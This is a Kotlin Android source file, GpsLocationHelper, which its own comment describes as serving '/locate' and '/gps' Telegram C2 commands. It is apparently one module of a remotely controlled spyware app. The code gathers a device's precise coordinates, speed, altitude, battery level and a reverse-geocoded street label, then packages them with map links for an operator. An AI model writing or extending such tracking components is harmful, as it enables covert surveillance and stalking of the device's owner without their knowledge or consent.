package com.example.core.recorder

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.BatteryManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.core.content.ContextCompat
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.atomic.AtomicBoolean

/**
 * GpsLocationHelper queries real-time GPS / Network telemetry for the /locate and /gps Telegram C2 commands.
 */
object GpsLocationHelper {

    private const val TAG = "GpsLocationHelper"

    data class LocationReport(
        val latitude: Double,
        val longitude: Double,
        val accuracyMeters: Float,
        val altitudeMeters: Double?,
        val speedKmh: Float?,
        val provider: String,
        val timeString: String,
        val batteryPct: Int,
        val googleMapsUrl: String,
        val openStreetMapUrl: String,
        val locationLabel: String = ""
    )

    @SuppressLint("MissingPermission")
    fun requestLocation(
        context: Context,
        onResult: (report: LocationReport?, errorMsg: String?) -> Unit
    ) {
        val hasFine = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.ACCESS_COARSE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED

        if (!hasFine && !hasCoarse) {
            Log.w(TAG, "Location permission not granted")
            onResult(null, "Location permission (FINE or COARSE) is not granted on this device.")
            return
        }

        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
        if (locationManager == null) {
            onResult(null, "LocationManager service is unavailable on this device.")
            return
        }

        val isGpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)
        val isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

        // Try getting the freshest last known location first as baseline
        var bestLastKnown: Location? = null
        if (isGpsEnabled) {
            val lastGps = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            if (lastGps != null) bestLastKnown = lastGps
        }
        if (isNetworkEnabled) {
            val lastNet = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (lastNet != null && (bestLastKnown == null || lastNet.time > bestLastKnown.time)) {
                bestLastKnown = lastNet
            }
        }

        val isDone = AtomicBoolean(false)
        val handler = Handler(Looper.getMainLooper())

        val listener = object : LocationListener {
            override fun onLocationChanged(loc: Location) {
                if (isDone.compareAndSet(false, true)) {
                    try {
                        locationManager.removeUpdates(this)
                    } catch (_: Exception) {}
                    val report = buildReport(context, loc)
                    onResult(report, null)
                }
            }

            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
            @Deprecated("Deprecated in Java")
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        }

        // Timeout fallback after 6 seconds
        handler.postDelayed({
            if (isDone.compareAndSet(false, true)) {
                try {
                    locationManager.removeUpdates(listener)
                } catch (_: Exception) {}

                if (bestLastKnown != null) {
                    val report = buildReport(context, bestLastKnown)
                    onResult(report, null)
                } else {
                    onResult(null, "GPS fix timed out and no cached location was available. Verify GPS is toggled on.")
                }
            }
        }, 6000L)

        // Request single update from available providers
        try {
            if (isGpsEnabled) {
                locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper())
            }
            if (isNetworkEnabled) {
                locationManager.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper())
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed requesting location updates: ${e.message}")
            if (bestLastKnown != null && isDone.compareAndSet(false, true)) {
                try { locationManager.removeUpdates(listener) } catch (_: Exception) {}
                onResult(buildReport(context, bestLastKnown), null)
            } else if (isDone.compareAndSet(false, true)) {
                try { locationManager.removeUpdates(listener) } catch (_: Exception) {}
                onResult(null, "Error querying location sensors: ${e.message}")
            }
        }
    }

    private fun buildReport(context: Context, loc: Location): LocationReport {
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
        val batteryPct = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
        val timeStr = SimpleDateFormat("dd MMM yyyy • hh:mm:ss a", Locale.getDefault()).format(Date(loc.time))

        val lat = loc.latitude
        val lng = loc.longitude
        val gmapsUrl = "https://maps.google.com/?q=$lat,$lng"
        val osmUrl = "https://www.openstreetmap.org/?mlat=$lat&mlon=$lng#map=17/$lat/$lng"

        val label = try {
            val geocoder = android.location.Geocoder(context, Locale.getDefault())
            val list = geocoder.getFromLocation(lat, lng, 1)
            if (!list.isNullOrEmpty()) {
                val addr = list[0]
                val subLocality = addr.subLocality ?: addr.locality ?: addr.adminArea
                val feature = addr.featureName ?: addr.thoroughfare
                if (!subLocality.isNullOrBlank() && !feature.isNullOrBlank() && subLocality != feature) {
                    "$feature, $subLocality"
                } else if (!subLocality.isNullOrBlank()) {
                    subLocality
                } else {
                    addr.getAddressLine(0) ?: "Lat: ${String.format(Locale.US, "%.4f", lat)}, Lon: ${String.format(Locale.US, "%.4f", lng)}"
                }
            } else {
                "Lat: ${String.format(Locale.US, "%.4f", lat)}, Lon: ${String.format(Locale.US, "%.4f", lng)}"
            }
        } catch (_: Exception) {
            "Lat: ${String.format(Locale.US, "%.4f", lat)}, Lon: ${String.format(Locale.US, "%.4f", lng)}"
        }

        return LocationReport(
            latitude = lat,
            longitude = lng,
            accuracyMeters = loc.accuracy,
            altitudeMeters = if (loc.hasAltitude()) loc.altitude else null,
            speedKmh = if (loc.hasSpeed()) (loc.speed * 3.6f) else null,
            provider = loc.provider ?: "sensors",
            timeString = timeStr,
            batteryPct = batteryPct,
            googleMapsUrl = gmapsUrl,
            openStreetMapUrl = osmUrl,
            locationLabel = label
        )
    }
}
